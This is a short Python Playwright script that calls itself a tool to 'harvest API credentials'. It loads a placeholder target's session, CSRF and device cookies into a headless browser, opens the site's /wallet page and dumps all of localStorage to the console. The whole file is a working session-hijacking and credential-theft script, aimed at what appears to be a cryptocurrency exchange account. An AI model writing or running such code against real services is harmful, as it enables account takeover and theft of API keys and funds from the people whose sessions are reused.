import asyncio
from playwright.async_api import async_playwright

async def harvest_keys():
    print("[*] Launching Playwright to harvest API credentials from JS runtime...")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        
        # Inject fresh SEAT Cookies & CSRF
        cookies = [
            {"name": "ISTIO_AUTH_SESSION_ID", "value": "082e749710ab5df7", "domain": "yourtarget.com", "path": "/", "secure": False, "httpOnly": True},
            {"name": "csrf", "value": "oO5i5JNdGnLNsjbx", "domain": ".yourtarget.com", "path": "/", "secure": True, "httpOnly": True},
            {"name": "d_id", "value": "1adf556bc330374a", "domain": ".yourtarget.com", "path": "/", "secure": True, "httpOnly": True},
            {"name": "bitso_cc", "value": "1", "domain": "yourtarget.com", "path": "/", "secure": False, "httpOnly": False}
        ]
        await context.add_cookies(cookies)
        
        page = await context.new_page()
        
        # Intercept local storage and window keys during navigation
        await page.goto("https://yourtarget.com/wallet", timeout=40000)
        await asyncio.sleep(6)
        
        # Search window objects or localStorage for credentials
        keys_dump = await page.evaluate("""() => {
            let results = {};
            for (let i = 0; i < localStorage.length; i++) {
                let k = localStorage.key(i);
                results[k] = localStorage.getItem(k);
            }
            return results;
        }""")
        
        print("\n[+] Full LocalStorage Dump:")
        import json
        print(json.dumps(keys_dump, indent=2))
        
        await browser.close()

if __name__ == "__main__":
    asyncio.run(harvest_keys())
